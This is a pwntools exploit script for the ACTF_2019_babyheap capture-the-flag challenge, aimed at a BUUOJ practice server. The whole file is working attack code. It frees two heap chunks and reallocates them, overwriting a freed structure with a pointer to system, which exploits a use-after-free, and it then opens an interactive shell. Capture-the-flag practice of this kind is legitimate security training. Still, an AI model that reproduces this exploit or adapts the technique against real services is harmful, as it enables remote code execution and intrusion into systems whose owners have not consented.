#!/usr/bin/env python
# coding=utf-8
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'

local = 0
if local == 1:
    r=process('./ACTF_2019_babyheap')
    gdb.attach(r,'b * 0x4009D2')
    #gdb.attach(r,'b * libc_malloc ')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r=remote('node4.buuoj.cn',26255)
    libc = ELF('./libc.so.6')

elf = ELF('./ACTF_2019_babyheap')

def add(size,content):
    r.recvuntil('choice:')
    r.sendline('1')
    r.recvuntil('size:')
    r.sendline(str(size))
    r.recvuntil('content:')
    r.send(content)

def show(num):
    r.recvuntil('choice:')
    r.sendline('3')
    r.recvuntil('index:')
    r.sendline(str(num))

def dele(num):
    r.recvuntil('choice:')
    r.sendline('2')
    r.recvuntil('index:')
    r.sendline(str(num))

add(0x68,'aaaaaaaa')
add(0x68,'bbbbbbbb')

dele(0)
dele(1)

add(0x10,p64(0x602010)+p64(elf.symbols['system']))

show(0)

r.interactive()
